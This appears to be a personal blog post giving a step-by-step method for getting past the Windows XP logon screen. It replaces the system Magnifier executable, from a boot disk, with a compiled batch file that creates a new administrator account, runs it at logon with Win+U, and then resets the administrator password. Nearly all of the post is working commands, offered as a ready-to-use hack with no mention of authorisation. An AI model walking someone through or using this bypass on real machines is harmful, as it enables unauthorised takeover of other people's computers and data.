---
layout: post
title: "Hack windows xp logon password"
description: ""
category: windows
tags: [windows]
---

### Hack steps:  
1.create a batch file, name magnify.bat
  add code as below:

    @net user hack 123456 /add
    
    @net localgroup administrators hack /add
    
    @exit

2.convert magnify.bat to magnify.exe by 
  bat2com.exe and com2exe.exe, then use 
  command as below:

    bat2com.exe magnify.bat

    com2exe.exe magnify.com

3.replace file c:/windows/system32/magnify.exe
  there are many ways to done this, one way is 
  burn a WinPE system to a U-disk, then login 
  the WinPE syste to replace it, you can use 
  other system(such as linux live CD) also; 
  another way is mount the hard disk to other 
  computer to do it.

4.power on computer, type win+u to run magnify
  at the logon screen. select and run the magnify program 

5.use hack to login, then change the password of
  administrator and delete hack in command line.
  use commands as below:

    net user (list user)

    net localgroup administrators (list user belong to administrators group)

    net user administrator 123456 (modify password)

    net user hack /del (delete user)

6.reboot and enjoy.

### Reference:  
+ [得到WindowsXP管理员权限的有效方法](https://www.doorcome.com/?p=42)
+ [Password Clearing: Clearing out any windows password](http://www.computersecuritystudent.com/FORENSICS/Password_Clearing/lesson1/index.html)
+ [Offline windows password & Registry editor](http://www.pogostick.net/~pnh/ntpasswd/)

